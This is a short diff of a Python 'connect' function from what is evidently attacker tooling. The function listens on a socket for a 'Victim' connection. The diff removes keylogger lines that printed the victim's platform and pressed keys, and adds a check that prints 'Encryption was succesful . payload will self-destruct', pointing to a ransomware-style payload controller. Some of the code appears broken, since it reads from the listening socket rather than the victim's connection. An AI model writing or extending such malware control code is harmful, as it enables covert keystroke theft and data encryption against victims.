@@ -1,4 +1,4 @@
-def connect(Connection_Type: str, port: int, type: str):
+def connect(Connection_Type: str, port: int):
     import socket
     import os
     from os import path
@@ -20,13 +20,11 @@ def connect(Connection_Type: str, port: int, type: str):
         Connection.listen()
         Victim, Address = Connection.accept()
 
-        os = Victim.recv(1024).decode('UTF-8')
-        print("[" + blue + 'REPORT' + reset + "]  Got Platfrom from victim")
         Connected = True
         while Connected:
-            key = Connection.recv(1024)
-            print("{} Pressed : {} ".format(Address, key))
-            
+            if Connection.recv(1024).decode("UTF-8") == "->|" :
+                print("Encryption was succesful . payload will self-destruct")
+
     except:
         Connected = False
         print("[" + red + '-' + reset +
